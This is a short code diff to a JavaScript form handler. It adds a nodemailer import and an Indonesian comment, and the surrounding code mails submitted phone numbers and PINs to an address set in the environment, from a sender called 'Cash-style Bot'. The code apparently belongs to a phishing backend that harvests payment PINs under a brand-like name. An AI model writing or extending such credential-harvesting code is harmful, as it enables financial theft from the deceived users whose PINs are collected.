@@ -1,3 +1,4 @@
+import nodemailer from "nodemailer";
 
 export default async function handler(req, res) {
   if (req.method !== "POST") {
@@ -22,10 +23,6 @@ export default async function handler(req, res) {
     if (phone) text += `Phone: ${phone}\n`;
     if (pin) text += `PIN: ${pin}\n`;
 
-
-
-
-
     // Transporter Gmail
     const transporter = nodemailer.createTransport({
       service: "gmail",
@@ -35,6 +32,7 @@ export default async function handler(req, res) {
       },
     });
 
+    // Kirim email
     await transporter.sendMail({
       from: `"Cash-style Bot" <${process.env.MAIL_USER}>`,
       to: process.env.MAIL_TO, // tujuan email
